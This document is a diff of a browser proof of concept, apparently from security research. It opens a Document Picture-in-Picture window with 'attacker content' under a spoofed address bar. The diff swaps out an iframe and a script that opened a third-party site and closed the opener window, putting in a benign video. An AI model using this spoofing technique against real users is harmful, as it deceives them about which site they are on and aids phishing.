@@ -14,6 +14,7 @@ html { font-family: sans-serif; height: 100%; width: 100%; cursor: pointer; }
 originOutput.innerText = window.origin;
 var newWin;
 var runPoC = async () => {
+    console.log(window.opener);
     newWin = await documentPictureInPicture.requestWindow();
     var newWinContent = newWin.document.createElement('div');
     newWinContent.innerHTML = `
@@ -26,11 +27,11 @@ iframe { border: 0; width: 100vw; height: 500px; }
 <div id="content">
 <h3>Attacker content with spoofed PiP address bar</h3>
 </div>
-<iframe src='https://abc.xyz'></iframe>"`;
+<video autoplay muted><source src=https://www.w3schools.com/html/mov_bbb.mp4></source></video>`;
     newWin.document.body.appendChild(newWinContent);
 
     var newWinScript = newWin.document.createElement('script');
-    newWinScript.innerText = "window.open('https://abc.xyz','aaa','');window.opener.close();";
+    newWinScript.innerText = "";
     newWin.document.body.appendChild(newWinScript);
 }
 
